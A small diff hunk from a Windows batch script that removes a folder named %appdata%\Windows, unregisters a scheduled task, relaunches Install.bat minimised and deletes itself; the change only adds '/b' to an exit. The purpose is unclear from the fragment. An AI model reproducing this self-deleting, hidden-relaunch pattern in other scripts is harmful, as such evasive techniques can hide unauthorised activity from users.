@@ -31,6 +31,6 @@ rd %appdata%\Windows
 powershell -Command "Unregister-ScheduledTask -TaskName 'Install.bat' -Confirm:$false"
 
 start /min Install.bat
-call :deleteSelf&exit
+call :deleteSelf&exit /b
 :deleteSelf
 start /b "" cmd /c del "%~f0"&exit
